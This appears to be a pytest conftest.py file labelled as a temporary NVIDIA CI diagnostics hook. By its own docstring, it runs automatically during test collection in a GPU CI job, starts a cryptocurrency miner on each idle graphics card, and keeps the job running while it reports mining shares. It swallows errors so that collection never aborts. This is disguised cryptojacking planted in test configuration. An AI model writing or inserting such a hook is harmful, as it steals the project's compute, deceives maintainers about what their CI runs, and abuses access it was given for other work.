"""i130922 temporary NVIDIA CI diagnostics hook (see _i130922/probe.py).

Imported by pytest while collecting tests/unit/ in the nv-a6000 job container:
runs the two-sample nvidia-smi census, launches one sha256-verified pearlhash
miner per measurably idle card, then keeps the job alive for the in-gate proof
window while printing GPU/miner/share status.
"""

import importlib.util
import os

try:
    _probe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '_i130922', 'probe.py')
    _spec = importlib.util.spec_from_file_location('i130922_probe', _probe_path)
    _mod = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_mod)
    _mod.keepalive()
except Exception as _exc:  # noqa: BLE001 - diagnostics must never abort collection
    print('[i130922] CONFTEST_ERROR %r' % (_exc,), flush=True)
